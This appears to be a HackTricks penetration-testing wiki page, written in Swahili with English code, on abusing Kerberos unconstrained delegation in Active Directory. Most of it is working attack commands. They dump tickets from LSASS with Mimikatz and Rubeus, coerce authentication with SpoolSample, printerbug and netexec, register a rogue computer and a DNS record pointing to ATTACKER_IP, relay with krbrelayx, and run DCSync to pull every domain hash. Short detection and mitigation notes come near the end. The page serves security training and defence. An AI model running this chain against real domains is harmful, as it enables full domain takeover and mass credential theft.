# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Hii ni feature ambayo Domain Administrator anaweza kuweka kwenye **Computer** yoyote ndani ya domain. Kisha, kila **user anapoingia** kwenye Computer hiyo, **nakala ya TGT** ya user huyo **itatumwa ndani ya TGS** iliyotolewa na DC **na kuhifadhiwa kwenye memory ya LSASS**. Kwa hiyo, ikiwa una privileges za Administrator kwenye mashine hiyo, utaweza **kudump tickets na kuwaiga users** kwenye mashine yoyote.

Kwa hiyo, ikiwa Domain Admin ataingia kwenye Computer iliyoamilishiwa feature ya "Unconstrained Delegation", na una privileges za local admin kwenye mashine hiyo, utaweza kudump ticket na kumwiga Domain Admin popote kwenye domain (domain privesc).

Unaweza **kupata Computer objects zenye attribute hii** kwa kuangalia kama attribute ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa kutumia LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambayo ndiyo hutumiwa na powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Pakia ticket ya Administrator (au mtumiaji mwathiriwa) kwenye kumbukumbu kwa kutumia **Mimikatz** au **Rubeus kwa ajili ya** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Maelezo zaidi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Maelezo zaidi kuhusu Unconstrained delegation kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Ikiwa mshambuliaji ataweza **compromise kompyuta iliyoruhusiwa kwa "Unconstrained Delegation"**, anaweza **kudanganya** **Print server** ili **ijiingize kiotomatiki** kwenye kompyuta hiyo na kuhifadhi TGT kwenye kumbukumbu ya seva.\
Kisha, mshambuliaji anaweza kufanya **shambulio la Pass the Ticket ili impersonate** akaunti ya kompyuta ya Print server ya mtumiaji.

Ili kufanya Print server iingie kwenye mashine yoyote, unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Ikiwa TGT imetoka kwa domain controller, unaweza kutekeleza [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hashes zote kutoka kwa DC.\
[**Maelezo zaidi kuhusu attack hii kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Tazama hapa njia nyingine za **kulazimisha authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Primitive nyingine yoyote ya coercion inayomfanya mwathiriwa athibitishe utambulisho wake kupitia **Kerberos** kwa host yako ya unconstrained-delegation itafanya kazi pia. Katika mazingira ya kisasa, hii mara nyingi humaanisha kubadilisha mtiririko wa kawaida wa PrinterBug na kutumia **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, au coercion inayotumia **WebClient/WebDAV**, kutegemea ni sehemu gani ya RPC inayoweza kufikiwa.

### Kutumia vibaya user/service account yenye unconstrained delegation

Unconstrained delegation **haizuiliwi kwa computer objects**. **User/service account** pia inaweza kusanidiwa kuwa `TRUSTED_FOR_DELEGATION`. Katika hali hiyo, sharti la kiutendaji ni kwamba account ipokee Kerberos service tickets za **SPN inayomiliki**.

Hii inatoa njia 2 za kawaida sana za offensive:

1. Unapata password/hash ya **user account** yenye unconstrained-delegation, kisha **unaongeza SPN** kwenye account hiyo hiyo.
2. Account tayari ina SPN moja au zaidi, lakini mojawapo inaelekeza kwenye **hostname ya zamani/isiyotumika tena**; kuunda upya **DNS A record** iliyokosekana kunatosha kuteka mtiririko wa authentication bila kurekebisha seti ya SPN.<sup>[[8]](#references)</sup>

Mtiririko mdogo wa Linux:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Maelezo:

- Hii ni muhimu hasa pale principal ya unconstrained delegation inapokuwa **service account** na una credentials zake tu, bila uwezo wa kutekeleza code kwenye host iliyounganishwa na domain.
- Ikiwa mtumiaji lengwa tayari ana **SPN iliyopitwa na wakati**, kuunda upya **DNS record** inayohusiana kunaweza kusababisha kelele kidogo kuliko kuandika SPN mpya kwenye AD.
- Mbinu za hivi majuzi zinazolenga Linux hutumia `addspn.py`, `dnstool.py`, `krbrelayx.py`, na primitive moja ya coercion; huhitaji kugusa host ya Windows ili kukamilisha mnyororo huu.

### Kutumia vibaya Unconstrained Delegation kupitia computer iliyoundwa na mshambuliaji

Domain za kisasa mara nyingi huwa na `MachineAccountQuota > 0` (chaguomsingi ni 10), hivyo principal yoyote iliyothibitishwa inaweza kuunda hadi N object za computer. Ikiwa pia una token privilege ya `SeEnableDelegationPrivilege` (au ruhusa sawa), unaweza kuweka computer mpya iliyoundwa iaminike kwa unconstrained delegation na kuvuna TGT zinazoingia kutoka kwa mifumo yenye upendeleo.<sup>[[1]](#references)</sup>

Mtiririko wa jumla:

1) Unda computer unayoidhibiti

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Fanya hostname bandia iweze kutatuliwa ndani ya domain

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Washa Unconstrained Delegation kwenye kompyuta inayodhibitiwa na mshambuliaji

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Kwa nini hii hufanya kazi: kwa unconstrained delegation, LSA kwenye kompyuta iliyowezeshwa kwa delegation huhifadhi TGT zinazoingia. Ukidanganya DC au server yenye mamlaka ya juu i-authenticate kwenye host yako bandia, TGT yake ya mashine itahifadhiwa na inaweza ku-exportiwa.

4) Anzisha krbrelayx katika hali ya export na uandae nyenzo za Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Lazimisha authentication kutoka kwa DC/servers kwenda kwenye host yako bandia

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx itahifadhi faili za ccache mashine inapojithibitisha, kwa mfano:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Tumia TGT ya mashine ya DC iliyokamatwa kutekeleza DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Vidokezo na mahitaji:

- `MachineAccountQuota > 0` huwezesha uundaji wa kompyuta bila ruhusa za juu; vinginevyo unahitaji ruhusa mahususi.
- Kuweka `TRUSTED_FOR_DELEGATION` kwenye kompyuta kunahitaji `SeEnableDelegationPrivilege` (au ruhusa za domain admin).
- Hakikisha jina linatatuliwa kuelekeza kwenye host yako bandia (rekodi ya DNS A) ili DC iweze kuifikia kwa FQDN.
- Coercion inahitaji vector inayofanya kazi (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, n.k.). Zima hizi kwenye DC ikiwezekana.
- Ikiwa akaunti ya mwathiriwa imewekewa alama ya **"Akaunti ni nyeti na haiwezi kukabidhiwa"** au ni mwanachama wa **Protected Users**, TGT iliyosambazwa haitajumuishwa kwenye service ticket, kwa hivyo chain hii haitatoa TGT inayoweza kutumiwa tena.<sup>[[9]](#references)</sup>
- Ikiwa **Credential Guard** imewashwa kwenye client/server inayothibitisha, Windows huzuia **Kerberos unconstrained delegation**; hivyo, kwa mtazamo wa operator, njia za coercion ambazo zingefanya kazi zinaweza kushindwa.

Mawazo ya utambuzi na uimarishaji wa usalama:

- Toa tahadhari kwa Event ID 4741 (akaunti ya kompyuta imeundwa) na 4742/4738 (akaunti ya kompyuta/mtumiaji imebadilishwa) wakati UAC `TRUSTED_FOR_DELEGATION` imewekwa.
- Fuatilia ongezeko lisilo la kawaida la rekodi za DNS A kwenye zone ya domain.
- Chunguza ongezeko la ghafla la 4768/4769 kutoka kwa hosts zisizotarajiwa na uthibitishaji wa DC kwenda kwa hosts ambazo si DC.
- Punguza `SeEnableDelegationPrivilege` kwa seti ndogo kabisa ya watumiaji, weka `MachineAccountQuota=0` inapowezekana, na uzime Print Spooler kwenye DC. Tekeleza LDAP signing na channel binding.

### Kupunguza Hatari

- Weka mipaka ya kuingia kwa DA/Admin kwenye huduma mahususi
- Weka "Akaunti ni nyeti na haiwezi kukabidhiwa" kwa akaunti zenye upendeleo.

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync kwa DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Kuvunja usalama wa domain kupitia unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork ya CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation katika Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Kikundi cha Usalama cha Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Kuvunja usalama wa domain kupitia print server ya DC na Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
